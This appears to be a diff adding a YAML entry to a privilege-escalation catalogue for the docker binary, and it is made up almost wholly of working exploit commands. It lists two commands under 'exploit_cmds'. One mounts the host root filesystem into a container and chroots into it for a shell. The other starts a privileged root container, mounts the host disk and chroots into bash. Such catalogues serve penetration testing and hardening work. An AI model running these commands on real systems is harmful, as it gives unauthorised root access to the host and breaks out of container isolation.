@@ -1,0 +1,11 @@
+name: docker
+binary_path: /usr/bin/docker
+exploit_cmds:
+- /usr/bin/docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
+- '/usr/bin/docker run --rm -it --privileged -u root alpine
+
+  mount /dev/sda1 /mnt/
+
+  ls -la /mnt/
+
+  chroot /mnt /bin/bash'
